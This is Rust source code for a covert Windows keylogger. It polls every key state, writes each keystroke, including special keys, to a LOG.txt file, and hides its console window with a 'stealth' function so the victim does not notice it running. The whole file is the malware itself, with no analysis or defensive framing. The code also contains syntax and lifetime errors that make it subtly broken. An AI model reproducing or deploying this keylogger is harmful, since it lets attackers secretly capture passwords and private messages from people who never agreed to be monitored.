extern crate winapi;
extern crate user32;
extern crate kernel32;
use std::fs::{File, OpenOptions};
use std::io::prelude::*;
fn main() {
	stealth();
	let mut file = match OpenOptions::new().append(true).open("LOG.txt") {
		Ok(file) => file,
		Err(e) => File::create("LOG.txt").unwrap()
	};
  loop {
  	for i in 8..190 {
    	if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
    		let key  = match i as u32 {
    			32 => " ",
    			8 => "[Backspace]",
    			13 => "\n",
    			winapi::VK_TAB => "[TAB]",
    			winapi::VK_SHIFT => "[SHIFT]",
    			winapi::VK_CONTROL => "[CTRL]",
    			winapi::VK_ESCAPE => "[ESCAPE]",
    			winapi::VK_END => "[END]",
    			winapi::VK_HOME => "[HOME]",
    			winapi::VK_LEFT => "[LEFT]",
    			winapi::VK_UP => "[UP]",
    			winapi::VK_RIGHT => "[RIGHT]",
    			winapi::VK_DOWN => "[DOWN]",
    			190|110 => ".",
    			_ => &(i as u8 as char).to_string();
    		};
    		write!(&mut file,"{}",key).unwrap();
    	}
    }
    file.flush().unwrap();
	}
}

fn stealth() {
	let mut stealth: winapi::HWND;
	unsafe {
		kernel32::AllocConsole();
		stealth = user32::FindWindowA(std::ffi::CString::new("ConsoleWindowClass").unwrap().as_ptr(), std::ptr::null());
		user32::ShowWindow(stealth,0);
	}
}
